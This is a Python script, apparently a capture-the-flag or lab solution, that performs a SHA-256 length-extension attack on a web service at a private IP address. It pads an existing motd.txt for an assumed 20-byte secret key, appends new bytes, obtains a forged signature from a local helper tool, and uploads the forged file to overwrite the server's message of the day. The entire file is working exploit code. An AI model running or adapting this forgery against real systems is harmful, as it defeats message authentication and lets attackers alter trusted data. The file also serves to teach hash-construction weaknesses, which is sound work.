from hashlib import sha256
from requests import post
from subprocess import check_output
from re import search

URL = 'http://10.0.23.61/'
KEY_LENGTH = 20
MESSAGE = b'ACKED'

def main() -> None:
    # read the old message
    with open('motd.txt', 'rb') as fin:
        message_old = fin.read()

    # call the bellow command and save the result into hmac
    cmd = f'./sha256 {KEY_LENGTH} {MESSAGE.decode()}'
    hmac = check_output(cmd.split()).decode().strip()
    # construct the new payload by using the old message, i.e. add padding and length
    message = construct_message(message_old, KEY_LENGTH)

    # save the newly created message into a file
    with open('motd_updated.txt', 'wb') as fout:
        fout.write(message)

    # send the new message and its hmac and check if the message was successfully changed
    if send_multipart_is_okay(hmac):
        print(f'\r[+] Message changed successfully (appended: H{MESSAGE.decode()})!')
        print(f'[*] New signature: {hmac}')
        print(f'[*] New message: {message.hex()}', end='\n\n')

def construct_message(message_old: str, key_length: int) -> bytes:
    # calculate how much padding should be added (9 means 8 bytes for length and 1 byte for b'\x80')
    length_to_append = (64 - key_length - len(message_old) % 64 - 9)

    # if the value is negative, add length of one whole block
    if length_to_append < 0:
        length_to_append += 64

    # create the padding
    message_old_padding = b'\x80' + b'\x00' * (length_to_append)
    # calculate the length of the old message + the key
    message_old_padding_size = bytes.fromhex(hex((len(message_old) + key_length) * 8)[2:].zfill(16))
    # construct the whole old message (with padding and length) that was used to get the hash value 69268ba87558295eedb751d8f4744b58bd2705ce5d09984f31927bb7fbfe9b97
    message_old = message_old + message_old_padding + message_old_padding_size

    # return the old message data concatenated with the new message
    return message_old + MESSAGE

def send_multipart_is_okay(hmac: str) -> bool:
    # try to change the message of the day
    response = post(
        URL,
        files = {
            'file': (
                'motd.txt',
                open('motd_updated.txt', 'rb'),
                'text/plain'
            ),
            'hmac': (None, hmac),
            'submit': (None, 'Submit')
        }
    )

    # return true if the motd is successfully changed; else, return false
    if 'Successfully changed message of the day!' in response.text:
        return True

    return False

if __name__ == '__main__':
    main()
